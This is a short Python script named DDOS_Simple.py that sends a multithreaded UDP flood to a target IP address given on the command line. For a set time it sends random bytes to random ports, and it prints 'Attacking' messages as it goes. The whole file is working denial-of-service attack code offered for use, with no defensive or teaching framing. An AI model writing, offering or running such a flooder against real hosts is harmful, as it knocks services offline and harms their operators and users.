import socket, time, random, threading, sys
#TCP almost always uses SOCK_STREAM and UDP uses SOCK_DGRAM.

# SAMPLE USAGE (ARGS)
# python3 DDOS_Simple.py <Target IP> <Threads> <Time>

def attack():
    while True:
        try:
          #  r = random
          #  r._urandom = random.SystemRandom(1024)
            bytes = random._urandom(1024)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ## FOR UDP
            while time.time() < Timeout:
                dport = random.randint(20, 55500)
                print(f"[!] Attacking {Target} on port {dport}")
                print(f"[!] Sent {bytes} bytes to {Target} on port {dport}")
                sock.sendto(bytes * random.randint(5, 15), (Target, dport))
                print("[+] Sent!")
        except Exception as e:
            print("[ERROR]", e)



if __name__ == '__main__':
    try:
        print("[!] Starting DDOS Attack")
        print("[!] Usage: python3 DDOS_Simple.py <Target IP> <Threads> <Time>")
        Target, Threads, Timer = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3])
        print(f"[!] Attacking {Target} for {Timer} seconds using {Threads} threads.")
    except IndexError as e:
        print("[ERROR] Usage: python3 DDOS_Simple.py <Target IP> <Threads> <Time>")
        print(e, "\n", sys.argv[0])
        sys.exit()

    Timeout = time.time() + 1 * Timer

    print("[!] Starting Attack-- [TIMEOUT]", Timeout)
    print(Target, Threads, Timer)
    for i in range(0, Threads):
        thread = threading.Thread(target=attack)
        thread.start()
        print(f"[{i}] Thread Started")
    print("[!] Done")